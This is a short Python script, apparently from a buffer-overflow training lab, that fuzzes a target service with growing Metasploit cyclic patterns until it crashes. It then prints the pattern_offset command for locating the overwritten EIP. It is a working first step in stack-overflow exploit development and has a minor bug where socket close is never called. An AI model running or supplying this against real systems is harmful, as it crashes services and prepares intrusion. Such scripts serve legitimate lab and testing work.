#!/usr/bin/python
# Quick Fuzzer with pattern_create and pattern_offset

import sys, socket, argparse, subprocess
from time import sleep

parser=argparse.ArgumentParser(
        description='''Simple fuzzer for stack based buffer overflows.''',
        epilog='''example: python3 fuzzer.py 10.10.111.82 1337 "OVERFLOW1 "''')
parser.add_argument('target ip', help='Target host ip running the vulnerable app')
parser.add_argument('target port', help='Target port')
parser.add_argument('command', help='Command of the vulnerable app. Dont forget space if needed. "TRUN "')
args = parser.parse_args()

length = 99
target = sys.argv[1]
port = int(sys.argv[2])
command = sys.argv[3]
pattern = ""

print("target: " + target + " port: " + str(port) + " command: " + command)
while True:
        try:
            pattern = subprocess.check_output(['/usr/share/metasploit-framework/tools/exploit/pattern_create.rb','-l',str(length)]).decode()
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target,port))
            print("Sending '" + command + "' plus " + str(len(pattern)) + " pattern chars")
            s.send((command.encode() + pattern.encode()))
            s.close
            sleep(1)
            length = length + 100
            print(s.recv(4096).decode())
        except:
            print("Fuzzing crashed or reached timeout (3sec) at %s bytes" % str(len(pattern) - 100))
            
            #print out follow on command for finding offset of overwritten EIP contents if more than 1 loop
            if int(len(pattern)) > 100:
                print("To find offset copy this command and insert the EIP contents at the end: ")
                print("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l %s -q " % str(len(pattern) -100))
            
            sys.exit()
